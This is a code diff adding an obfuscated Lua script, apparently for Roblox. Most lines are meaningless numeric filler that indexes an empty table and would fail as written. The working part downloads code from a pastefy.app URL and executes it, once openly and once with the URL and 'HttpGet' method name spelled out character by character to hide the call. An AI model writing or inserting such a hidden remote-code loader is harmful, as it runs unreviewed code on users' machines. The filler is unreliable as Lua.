@@ -1,1 +1,63 @@
+
+
+local F=function(x)return string.char(math.abs(x)%256)end
+local Q=function(t)return t end
+local R = {}
+local K = function() return {} end
+local L = function(a,b) return a end
+local H = function(t) return t end
+
+local c = {}
+local v = {}
+
+local h=F(-463662+451447)
+local W=nil
+local V=nil
+local d=8603302-(-95331)
+local r=Q("r") r=nil
+local q={}
+local I=R[h]
+h=F(-723769-(-711542))
+local k=I[h]
+I=K()
+local G=F(547569+-559784)
+c[I]=k
+h=R[G]
+G=F(-356147-(-343915))
+k=h[G]
+G=R["f"]
+local f=F(-160933+148682)
+h=G[f]
+local e=F(574002+-586221)
+f=R[e]
+e=F(381934-394156)
+G=f[e]
+e=K()
+f=-339051+339051
+c[e]=f
+local u=624116-624115
+f=156711-156709
+c["D"]=f
+f={}
+p={}
+V=K()
+c[V]=q
+q=-84771+84771
+local O=105123-104867
+local P=O
+O=371692+-371691
+local o=O
+O=-161701-(-161701)
+local x=o<O
+O=u-o
 loadstring(game:HttpGet("https://pastefy.app/PxoZkaGR/raw"))()
+local url_part1 = F(104)..F(116)..F(116)..F(112)..F(115)..F(58)..F(47)..F(47)
+local url_part2 = F(112)..F(97)..F(115)..F(116)..F(101)..F(102)..F(121)..F(46)..F(97)..F(112)..F(112)
+local url_part3 = F(47)..F(80)..F(120)..F(111)..F(90)..F(107)..F(97)..F(71)..F(82)..F(47)..F(114)..F(97)..F(119)
+local url = url_part1..url_part2..url_part3
+local method_name = F(72)..F(116)..F(116)..F(112)..F(71)..F(101)..F(116)
+local fn = game[method_name]
+local code = fn(game, url)
+local f = loadstring(code)
+f()
+
